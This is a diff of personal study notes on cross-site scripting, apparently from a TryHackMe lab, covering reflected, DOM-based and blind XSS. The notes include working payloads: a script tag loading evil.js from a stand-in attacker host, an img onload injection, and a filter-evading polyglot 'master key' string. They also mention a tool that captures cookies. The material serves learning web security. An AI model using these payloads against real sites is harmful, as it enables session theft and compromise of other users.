@@ -33,7 +33,7 @@ ___
 
 User input in HTTP request is included in webpage without validation
 
-Example: website displays error message when input is invalid
+*Example:* website displays error message when input is invalid
 `https://website.thm/?error=Invalid Input Detected`
 --> `https://website.thm/?error=<script src="https://attacker.thm/evil.js"></script>`
 
@@ -59,16 +59,14 @@ ___
 ### DOM Based XSS
 [[#Table of contents|Back to the top]]
 
-Document Object Model: programming interface for HTML and XML documents, represents page so programs can change document structure, style, content
-
-HTML DOM
+HTML [[DOM]]
 ![[Pasted image 20251126143606.png]]
 [Learn more](https://www.w3.org/TR/REC-DOM-Level-1/introduction.html)
 
 JS execution happens directly in browser without any new page being loaded or data being submitted to backend code
 Execution happens when website JS code acts on input or user interaction
 
-Example:
+*Example*
 Website JS gets content from **`window.location.hash`** parameter and writes on page in currently viewed section
 Contents of hash aren't checked for malicious code --> possible injection
 
@@ -81,12 +79,18 @@ ___
 
 Similar to [[#Stored XSS]]: payload gets stored on webapp for other user to view but can't see payload working or be able to test
 
-Example:
+*Example*
 Webapp has contact form, message content isn't checked
 --> could reveal staff portal URL (where they handle the tickets)
 
+[[#Blind XSS practical]] has example of payload
+
 Ways to test: ensure payload has a **call back** (know when code is being executed)
-Popular tool: [XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express) --> automatically capture cookies, URLs, page contents, ...
+Popular tool: **[XSS Hunter Express](https://github.com/mandatoryprogrammer/xsshunter-express)** --> automatically capture cookies, URLs, page contents, ...
+
+```
+">><<script>>alert('THM');<</script>>
+```
 
 ___
 ### Payload Perfection
@@ -137,6 +141,11 @@ ___
 </div>
 ```
 Closing the placeholder and the tag with `">` doesn't work --> take advantage of attribute `onload` (executes command when image is loaded) of `<img>` tag: `/images/cat.jpg" onload="alert('Hacked!');`
+
+"Master key"
+```
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
+```
 
 ___
 ### Blind XSS practical
